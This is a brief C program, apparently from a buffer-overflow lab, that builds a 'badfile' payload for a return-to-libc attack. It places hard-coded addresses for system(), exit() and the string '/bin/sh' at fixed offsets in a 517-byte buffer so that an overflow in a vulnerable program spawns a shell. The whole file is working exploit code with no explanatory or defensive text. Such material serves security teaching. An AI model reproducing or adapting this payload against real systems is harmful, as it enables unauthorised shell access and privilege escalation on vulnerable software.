#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
	char buf[517];
	FILE *badfile;
	badfile = fopen("./badfile", "w");

	
	*(long *) &buf[16] = 0xb7e1f2e0; // system()
	*(long *) &buf[20] = 0xb7e124b0; // exit()
	*(long *) &buf[24] = 0xb7f600af; // "/bin/sh"
	fwrite(buf, 517, 1, badfile);
	fclose(badfile);
}
